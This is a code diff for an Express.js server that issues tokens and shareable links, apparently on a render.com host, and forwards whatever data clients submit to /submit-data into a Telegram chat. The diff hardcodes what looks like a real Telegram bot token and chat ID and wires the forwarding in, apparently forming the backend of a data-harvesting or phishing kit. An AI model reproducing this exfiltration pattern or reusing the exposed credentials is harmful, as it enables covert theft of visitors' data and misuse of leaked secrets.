@@ -2,6 +2,7 @@ const express = require('express');
 const bodyParser = require('body-parser');
 const fetch = require('node-fetch');
 const cors = require('cors');
+const { v4: uuidv4 } = require('uuid'); // For generating unique tokens
 
 const app = express();
 const port = process.env.PORT || 3000;
@@ -17,11 +18,11 @@ app.use(cors({
 app.use(bodyParser.urlencoded({ extended: true }));
 app.use(bodyParser.json());
 
-// Telegram Configuration (optional, can be removed if not needed)
-const botToken = process.env.BOT_TOKEN || 'YOUR_BOT_TOKEN'; // Replace with your bot token
-const chatId = process.env.CHAT_ID || 'YOUR_CHAT_ID'; // Replace with your chat ID
+// Telegram Configuration
+const botToken = process.env.BOT_TOKEN || '7462569364:AAFopBu0YGk8EMPhxDDGrkiNhkqEC8F0XDM'; // Replace with your bot token
+const chatId = process.env.CHAT_ID || '-1002406480101'; // Replace with your chat ID
 
-// Function to send a message to Telegram (optional, can be removed if not needed)
+// Function to send a message to Telegram
 async function sendTelegramMessage(message) {
     const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
     const params = new URLSearchParams({
@@ -62,7 +63,7 @@ app.post('/generate-token', (req, res) => {
         timestamp: new Date().toISOString(), // Timestamp for tracking
     };
 
-    const token = Math.random().toString(36).substring(2, 15); // Generate a random token
+    const token = uuidv4(); // Generate a unique token
     sessions[token] = sessionData; // Store session data
 
     const shareableLink = `https://test-em43.onrender.com/share?token=${token}`; // Shareable link
@@ -113,14 +114,14 @@ app.get('/share', (req, res) => {
     }
 });
 
-// Endpoint to handle incoming data (for Telegram notifications, optional)
+// Endpoint to handle incoming data (for Telegram notifications)
 app.post('/submit-data', (req, res) => {
     try {
         const gatheredData = req.body; // Data gathered by the client
         console.log('Data received from client:', gatheredData);
 
         // Process the gathered data (e.g., save to database, send notifications)
-        // ...
+        sendTelegramMessage(`New data received: ${JSON.stringify(gatheredData)}`);
 
         res.status(200).send('Data received successfully');
     } catch (error) {
